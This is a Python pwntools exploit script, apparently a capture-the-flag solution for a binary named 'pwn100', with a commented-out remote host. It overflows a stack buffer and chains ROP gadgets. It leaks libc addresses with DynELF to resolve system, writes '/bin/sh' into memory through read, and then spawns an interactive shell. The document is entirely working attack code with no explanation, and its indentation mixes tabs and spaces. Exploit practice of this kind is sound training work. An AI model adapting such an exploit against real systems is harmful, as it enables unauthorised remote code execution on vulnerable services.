
#!/usr/bin/python
#coding:utf-8
 
from pwn import*
 
 
start_addr=0x400550
pop_rdi=0x400763
gadget1=0x40075a
gadget2=0x400740
binsh_addr=0x60107c
 
 
io = process('./pwn100') 
#io=remote("111.198.29.45","31154")
elf=ELF("./pwn100")
 
puts_addr = elf.plt['puts']
read_got = elf.got['read']
 
def leak(addr):
	count=0
	up=''
	content=''
	payload='a'*72
	payload+=p64(pop_rdi)
	payload+=p64(addr)
        payload += p64(puts_addr)
	payload+=p64(start_addr)
	payload=payload.ljust(200,'a')
	io.send(payload)
	io.recvuntil("bye~\n")
	while True:
		c=io.recv(numb=1,timeout=0.1)
		count+=1
 
		if up == '\n' and c == "": 
			content=content[:-1]+'\x00'
			break				
		else:
			content+=c
			up=c
	content=content[:4]
        log.info("%#x => %s" % (addr, (content or '').encode('hex')))
	return content
 
 
 
d = DynELF(leak, elf = elf)
system_addr = d.lookup('system', 'libc')
log.info("system_addr = %#x", system_addr)
 
payload='a'*72
payload+=p64(gadget1)
payload+=p64(0)      #rbx=0
payload+=p64(1)      #rbp=1  call 
payload+=p64(read_got)	# read
payload+=p64(8)		#read size
payload+=p64(binsh_addr)	
payload+=p64(0)		#r15 read canshu
payload+=p64(gadget2)
payload+='\x00'*56
payload+=p64(start_addr)
payload=payload.ljust(200,'a')
 
io.send(payload)
io.recvuntil('bye~\n')
io.send('/bin/sh\x00')
 
 
payload = "A"*72				
payload += p64(pop_rdi)	#system("/bin/sh\x00")	
payload += p64(binsh_addr)		
payload += p64(system_addr)		
payload = payload.ljust(200, "B")	
 
io.send(payload)
io.interactive()
